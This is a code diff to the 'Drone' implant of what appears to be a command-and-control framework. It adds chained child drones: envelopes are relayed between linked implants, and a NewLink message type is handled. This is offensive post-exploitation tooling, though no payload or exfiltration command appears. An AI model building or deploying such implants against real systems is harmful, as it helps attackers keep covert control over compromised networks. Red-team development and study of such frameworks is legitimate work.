@@ -26,6 +26,7 @@ namespace Drone
         private bool _running;
 
         private readonly List<DroneModule> _modules = new();
+        private readonly List<Handler> _children = new();
         private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();
 
         public delegate void Callback(DroneTask task, CancellationToken token);
@@ -51,30 +52,75 @@ namespace Drone
                 // check if handler has given up
                 if (t.IsCompleted) return;
                 
-                if (!_handler.GetInbound(out var messages))
+                // check children
+                foreach (var child in _children)
+                {
+                    if (!child.GetInbound(out var childEnvelopes)) continue;
+                    
+                    foreach (var childEnvelope in childEnvelopes)
+                        _handler.QueueOutbound(childEnvelope);  // shove them directly in the outbound queue
+                }
+                
+                if (!_handler.GetInbound(out var envelopes))
                 {
                     Thread.Sleep(100);                    
                     continue;
                 }
 
-                foreach (var message in messages) HandleMessageEnvelope(message);
+                foreach (var envelope in envelopes)
+                    HandleMessageEnvelope(envelope);
             }
         }
 
         private void HandleMessageEnvelope(MessageEnvelope envelope)
         {
-            var message = _crypto.DecryptEnvelope(envelope);
-            
-            if (message.Type == C2Message.MessageType.DroneTask)
+            // if not for this drone, send to children
+            if (!envelope.Drone.Equals(_metadata.Guid))
             {
-                var tasks = Convert.FromBase64String(message.Data).Deserialize<IEnumerable<DroneTask>>().ToArray();
-                if (tasks.Any()) HandleDroneTasks(tasks);
+                foreach (var child in _children)
+                    child.QueueOutbound(envelope);
+
+                return;
+            }
+            
+            // otherwise handle it
+            var message = _crypto.DecryptEnvelope(envelope);
+
+            switch (message.Type)
+            {
+                case C2Message.MessageType.DroneTask:
+                {
+                    var tasks = Convert.FromBase64String(message.Data).Deserialize<IEnumerable<DroneTask>>().ToArray();
+                    if (tasks.Any()) HandleDroneTasks(tasks);
+                    
+                    break;
+                }
+
+                case C2Message.MessageType.NewLink:
+                {
+                    var reply = new C2Message(C2Message.MessageDirection.Upstream, C2Message.MessageType.NewLink, _metadata)
+                    {
+                        Data = Convert.ToBase64String(message.Metadata.Serialize())
+                    };
+                    
+                    SendC2Message(reply);
+                    
+                    break;
+                }
+
+                // these shouldn't happen here
+                case C2Message.MessageType.DroneModule: break;
+                case C2Message.MessageType.DroneTaskUpdate: break;
+
+                default:
+                    throw new ArgumentOutOfRangeException();
             }
         }
 
         private void HandleDroneTasks(IEnumerable<DroneTask> tasks)
         {
-            foreach (var task in tasks) HandleDroneTask(task);
+            foreach (var task in tasks)
+                HandleDroneTask(task);
         }
 
         private void HandleDroneTask(DroneTask task)
@@ -206,6 +252,16 @@ namespace Drone
             var token = _taskTokens[taskGuid];
             token.Cancel();
             _taskTokens.Remove(taskGuid);
+        }
+
+        public void AddChildDrone(Handler handler)
+        {
+            var message = new C2Message(C2Message.MessageDirection.Downstream, C2Message.MessageType.NewLink, _metadata);
+            var envelope = _crypto.EncryptMessage(message);
+            
+            handler.QueueOutbound(envelope);
+            handler.Start();
+            _children.Add(handler);
         }
 
         private void LoadDroneModule(DroneModule module)
